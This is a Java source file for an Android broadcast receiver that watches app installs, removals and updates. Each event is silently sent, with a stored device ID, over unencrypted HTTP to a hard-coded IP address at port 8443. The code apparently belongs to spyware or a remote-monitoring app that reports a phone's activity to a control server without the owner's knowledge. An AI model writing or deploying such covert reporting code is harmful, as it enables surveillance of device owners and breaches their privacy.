package com.alzahra.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class PackageReceiver extends BroadcastReceiver {
    private static final String TAG = "AlZahraPkg";
    private static final String SERVER = "http://216.128.156.226:8443";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            Uri data = intent.getData();
            String pkg = data != null ? data.getSchemeSpecificPart() : "unknown";
            String action = intent.getAction();
            
            String type = "unknown";
            if (Intent.ACTION_PACKAGE_ADDED.equals(action)) type = "installed";
            else if (Intent.ACTION_PACKAGE_REMOVED.equals(action)) type = "removed";
            else if (Intent.ACTION_PACKAGE_REPLACED.equals(action)) type = "replaced";
            
            JSONObject obj = new JSONObject();
            obj.put("package", pkg);
            obj.put("action", type);
            obj.put("replacing", intent.getBooleanExtra(Intent.EXTRA_REPLACING, false));
            
            sendData(context, obj.toString());
        } catch (Exception e) {
            Log.e(TAG, "Package error", e);
        }
    }
    
    private void sendData(Context context, String content) {
        new Thread(() -> {
            try {
                String deviceId = context.getSharedPreferences("alzahra_prefs", Context.MODE_PRIVATE)
                    .getString("device_id", "UNKNOWN");
                
                URL url = new URL(SERVER + "/api/data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                
                JSONObject json = new JSONObject();
                json.put("device_id", deviceId);
                json.put("type", "package");
                json.put("content", content);
                json.put("time", System.currentTimeMillis());
                
                conn.getOutputStream().write(json.toString().getBytes());
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Send error", e);
            }
        }).start();
    }
}
